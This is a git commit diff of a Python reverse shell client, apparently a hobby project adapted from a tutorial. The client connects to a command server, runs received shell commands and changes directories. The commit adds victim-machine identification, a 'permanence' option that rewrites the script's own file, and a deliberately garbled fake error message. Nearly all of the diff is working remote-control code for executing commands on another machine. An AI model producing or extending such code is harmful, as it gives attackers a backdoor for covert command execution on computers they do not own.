8c5e1d8d25e08f2609f4fa7506f1b2164922d761
natheypi <120124211+natheypi@users.noreply.github.com>
2022-12-10 20:31:10 -0500

    Added id modification and a bit of permanency in a now more complex proto_client.py

--- Client/proto_client.py
+++ Client/proto_client.py
@@ -1,23 +1,47 @@
 import socket
 import os
 import subprocess
-import sys
-import time
 import datetime
-import uuid
 
 # https://www.thepythoncode.com/article/create-reverse-shell-python#:~:text=How%20to%20Create%20a%20Reverse%20Shell%20in%20Python,are%20some%20ideas%20to%20extend%20that%20code%3A%20
-
-
-def get_id():
-    return os.environ['COMPUTERNAME']  # TODO ?find better id?
-
-
-SERVER_HOST = sys.argv[1]
+ID = ''
+SERVER_HOST = '127.0.0.1'  # sys.argv[1]
 SERVER_PORT = 2424
 BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
 SEPARATOR = '<sep>'  # separator string for sending 2 messages in one go
+
+COMPUTERNAME = os.environ['COMPUTERNAME']
+
+permanence = False
 output = ' '
+
+
+def set_permanence(_permanence: bool):
+    global permanence
+    permanence = _permanence
+    return permanence
+
+
+def set_id(_id=COMPUTERNAME):
+    global ID
+    if permanence:
+        with open(__file__, 'r') as fr:
+            code_with_id = fr.read().replace('ID = \'\'', f'ID = \'{_id}\'')
+
+        with open(__file__, 'w') as fw:
+            print('write with permanence')
+            fw.write(code_with_id)
+    ID = _id
+    return _id
+
+
+def get_id():
+    global ID
+    if ID == '':
+        set_id()
+    return ID
+
+
 # create the socket object
 sock = socket.socket()
 
@@ -38,22 +62,29 @@ while True:
     if not command:
         continue
 
-    elif command.lower() == 'kill':
+    elif command.lower() == '$kill':
         break  # if the command is exit, just break out of the loop
-
+    elif command.lower()[:3] == '$id':
+        if len(command) == 3:
+            output = get_id()
+        else:
+            output = set_id(command[3:])
+    elif command.lower() == '$p':
+        set_permanence(True)
+        output = '#$rr ^ PERMANENCE s@*uldn\'t be -_---___ error'
     elif command[:2] == 'cd':  # cd command, change directory (str[start:end:step])
         try:
-            # remove cd and remove leading space 
+            # remove cd and remove leading space
             command = command[2:].strip()  # removing ending at the same time because why not
 
             if len(command) < 3:
                 command += 'c:\\'[len(command):]  # c: --> c:\ and c --> c:\                    at least I hope
-            
+
             os.chdir(command)
 
         except FileNotFoundError as err:
             output = str(err)  # if there is an error, set as the output
-        
+
         else:
             output = ''  # if operation is successful, empty message
     elif command.lower() == 'health':
